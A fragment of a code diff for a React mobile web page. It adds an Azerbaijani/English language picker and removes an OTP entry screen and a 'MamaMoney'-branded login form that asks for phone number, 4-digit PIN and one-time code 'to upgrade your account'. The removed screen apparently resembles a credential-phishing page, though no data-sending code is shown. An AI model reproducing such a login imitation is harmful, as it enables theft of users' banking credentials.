-                <ChevronLeft className="w-8 h-8 text-[#043323]" strokeWidth={2.5} />
+                <ChevronDown className="w-6 h-6" />
               </button>
             </div>
 
-            {/* Title & Sent To Subtitle */}
-            <div className="mb-6 text-center">
-              <h1 className="text-[#043323] text-2xl sm:text-3xl font-extrabold text-center leading-snug">
-                Enter the OTP code<br />we sent to your phone
-              </h1>
-              <p className="text-white text-sm font-medium mt-2">
-                Sent to {formatMaskedPhone(cellphone)}
-              </p>
+            {/* Language Options List */}
+            <div className="space-y-3 pt-1">
+              {/* Option 1: Azerbaijan */}
+              <button
+                type="button"
+                onClick={() => {
+                  setSelectedLang("az")
+                  setIsLangModalOpen(false)
+                }}
+                className={`w-full flex items-center justify-between p-4 rounded-2xl border transition-all cursor-pointer text-left ${
+                  selectedLang === "az"
+                    ? "bg-[#1d439b]/10 border-[#1d439b] shadow-xs"
+                    : "bg-[#f8fafc] border-gray-100 hover:bg-gray-100/70"
+                }`}
+              >
+                <div className="flex items-center gap-3.5">
+                  <AzerbaijanFlag className="w-7 h-7" />
+                  <span className="text-base font-semibold text-gray-900">
+                    Azərbaycan
+                  </span>
+                </div>
+                {selectedLang === "az" && (
+                  <div className="w-6 h-6 rounded-full bg-[#1d439b] flex items-center justify-center text-white">
+                    <Check className="w-3.5 h-3.5 stroke-[3]" />
+                  </div>
+                )}
+              </button>
+
+              {/* Option 2: English */}
+              <button
+                type="button"
+                onClick={() => {
+                  setSelectedLang("en")
+                  setIsLangModalOpen(false)
+                }}
+                className={`w-full flex items-center justify-between p-4 rounded-2xl border transition-all cursor-pointer text-left ${
+                  selectedLang === "en"
+                    ? "bg-[#1d439b]/10 border-[#1d439b] shadow-xs"
+                    : "bg-[#f8fafc] border-gray-100 hover:bg-gray-100/70"
+                }`}
+              >
+                <div className="flex items-center gap-3.5">
+                  <UKFlag className="w-7 h-7" />
+                  <span className="text-base font-semibold text-gray-900">
+                    English
+                  </span>
+                </div>
+                {selectedLang === "en" && (
+                  <div className="w-6 h-6 rounded-full bg-[#1d439b] flex items-center justify-center text-white">
+                    <Check className="w-3.5 h-3.5 stroke-[3]" />
+                  </div>
+                )}
+              </button>
             </div>
-
-            {/* 5 OTP Input Boxes */}
-            <div className="flex flex-col items-center gap-2 mb-8">
-              <div className="flex justify-center items-center gap-2 sm:gap-3 w-full max-w-[340px]">
-                {otpDigits.map((digit, index) => (
-                  <input
-                    key={index}
-                    ref={(el) => {
-                      inputRefs.current[index] = el
-                    }}
-                    type="tel"
-                    inputMode="numeric"
-                    pattern="[0-9]*"
-                    maxLength={1}
-                    value={digit}
-                    onFocus={() => setFocusedIndex(index)}
-                    onChange={(e) => handleOtpChange(index, e.target.value)}
-                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
-                    className={`w-12 h-14 sm:w-14 sm:h-16 bg-white text-[#043323] text-xl sm:text-2xl font-bold text-center rounded-xl focus:outline-none transition-all ${focusedIndex === index
-                      ? "border-2 border-[#f59e0b] ring-1 ring-[#f59e0b]"
-                      : "border border-gray-200"
-                      }`}
-                  />
-                ))}
-              </div>
-              {error && (
-                <p className="text-red-700 text-sm mt-2 text-center font-bold bg-white/80 py-1.5 px-4 rounded-lg shadow-sm">
-                  {error}
-                </p>
-              )}
-            </div>
           </div>
-
-          {/* Action Buttons & Timer */}
-          <div className="flex flex-col gap-3 w-full">
-            {/* Confirm Button */}
-            <button
-              onClick={handleVerify}
-              disabled={isOtpLoading}
-              className="w-full bg-[#043323] hover:bg-[#06422e] active:scale-[0.99] text-white py-3.5 sm:py-4 rounded-2xl text-base sm:text-lg font-bold shadow-md transition-all cursor-pointer flex items-center justify-center gap-2 disabled:opacity-80"
-            >
-              {isOtpLoading ? (
-                <>
-                  <Loader2 className="w-5 h-5 animate-spin text-white" />
-                  <span>Confirming...</span>
-                </>
-              ) : (
-                "Confirm"
-              )}
-            </button>
-
-            {/* Timer Pill */}
-            <div className="w-full bg-white/30 rounded-2xl py-3 px-4 flex items-center justify-center gap-2 text-[#043323] font-bold text-base">
-              <Clock className="w-5 h-5 text-[#043323]" />
-              <span>{formatTimer(timer)}</span>
-            </div>
-
-            {/* Cancel Link */}
-            <button
-              onClick={handleBackToLogin}
-              className="text-[#043323] text-base sm:text-lg font-bold text-center mt-1 hover:underline cursor-pointer"
-            >
-              Cancel
-            </button>
-          </div>
-        </div>
-      </div>
-    )
-  }
-
-  // 4. LOGIN SCREEN (Pattern BG strictly behind all elements)
-  return (
-    <div className="min-h-[100dvh] w-full bg-[#60ac28] flex justify-center">
-      <div className="min-h-[100dvh] max-w-[430px] relative overflow-x-hidden flex flex-col justify-between px-6 pt-5 pb-8 select-none w-full shadow-2xl">
-        {/* Pattern Background strictly in background z-0 */}
-        <LoginBackground />
-
-      {/* Login Screen Interactive Content in z-10 */}
-      <div className="relative z-10 flex flex-col items-center w-full">
-        {/* Top Back Arrow */}
-        <div className="w-full flex items-center justify-start mb-2">
-          <button
-            onClick={handleBackToLogin}
-            className="p-1 -ml-1 text-[#043323] active:opacity-70 cursor-pointer"
-            aria-label="Back"
-          >
-            <ChevronLeft className="w-8 h-8 text-[#043323]" strokeWidth={2.5} />
-          </button>
-        </div>
-
-        {/* Logo Section */}
-        <div className="flex flex-col items-center mb-3">
-          <MamaMoneyLogo />
-        </div>
-
-        {/* Subtitle Text */}
-        <p className="text-white text-sm sm:text-base font-semibold text-center mb-5">
-          Enter your login details to upgrade your account.
-        </p>
-
-        {/* Form Fields */}
-        <div className="w-full flex flex-col gap-4 mb-6">
-          {/* Cellphone Number Input */}
-          <div>
-            <input
-              type="tel"
-              inputMode="numeric"
-              value={cellphone}
-              onChange={(e) => {
-                const val = e.target.value.replace(/[^0-9]/g, "")
-                setCellphone(val)
-                if (errors.cellphone && val.length >= 10) setErrors({ ...errors, cellphone: undefined })
-              }}
-              placeholder="Cellphone Number"
-              className="w-full px-4 py-3.5 bg-transparent border border-white text-white placeholder:text-white text-base focus:outline-none focus:border-white transition-all rounded-sm"
-            />
-            {(errors.cellphone || (cellphone.length > 0 && cellphone.length < 10)) && (
-              <p className="text-[#facc15] text-xs font-semibold mt-1.5 ml-0.5">
-                Phone number must be at least 10 digits.
-              </p>
-            )}
-          </div>
-
-          {/* Pin Input */}
-          <div>
-            <input
-              type="password"
-              maxLength={4}
-              value={pin}
-              onChange={(e) => {
-                const val = e.target.value.replace(/[^0-9]/g, "").slice(0, 4)
-                setPin(val)
-                if (errors.pin && val.length === 4) setErrors({ ...errors, pin: undefined })
-              }}
-              placeholder="Enter 4 digit PIN"
-              inputMode="numeric"
-              className="w-full px-4 py-3.5 bg-transparent border border-white text-white placeholder:text-white text-base focus:outline-none focus:border-white transition-all rounded-sm"
-            />
-            {errors.pin && (
-              <p className="text-[#facc15] text-xs font-semibold mt-1.5 ml-0.5">{errors.pin}</p>
-            )}
-          </div>
-        </div>
-
-        {/* Action Buttons Container */}
-        <div className="flex flex-col gap-3.5 w-full items-center">
-          {/* Login Button */}
-          <button
-            onClick={handleLogin}
-            disabled={isLoginLoading}
-            className="w-full bg-[#043323] hover:bg-[#06422e] active:scale-[0.98] text-white py-3.5 px-6 rounded-2xl flex items-center justify-center gap-2 text-base font-semibold shadow-md transition-all cursor-pointer disabled:opacity-80"
-          >
-            {isLoginLoading ? (
-              <>
-                <Loader2 className="w-5 h-5 animate-spin text-white" />
-                <span>Please wait...</span>
-              </>
-            ) : (
-              <>
-                <span>Login to upgrade</span>
-                <ArrowRight className="w-5 h-5 text-white" strokeWidth={2.5} />
-              </>
-            )}
-          </button>
-
-          {/* Check Rates Button */}
-          <button
-            onClick={() => setScreen("rates")}
-            className="w-full bg-[#043323] hover:bg-[#06422e] active:scale-[0.98] text-white py-3.5 px-6 rounded-2xl flex items-center justify-center gap-2 text-base font-semibold shadow-md transition-all cursor-pointer"
-          >
-            <span>Check Rates</span>
-            <ArrowRight className="w-5 h-5 text-white" strokeWidth={2.5} />
-          </button>
-
-          {/* Remember Me Container */}
-          <div
-            onClick={() => setRememberMe(!rememberMe)}
-            className="w-full bg-white/20 border border-white/30 rounded-2xl py-3 px-5 flex items-center justify-center gap-3 cursor-pointer select-none mt-1"
-          >
-            <div className="w-6 h-6 rounded-md bg-white flex items-center justify-center shrink-0 shadow-inner">
-              {rememberMe && (
-                <svg viewBox="0 0 24 24" className="w-4 h-4 text-[#043323] fill-none stroke-current" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round">
-                  <polyline points="20 6 9 17 4 12" />
-                </svg>
-              )}
-            </div>
-            <span className="text-[#043323] text-base font-bold">Remember me</span>
-          </div>
-        </div>
-      </div>
+        </>
+      )}
     </div>
-  </div>
-)
+  )
 }
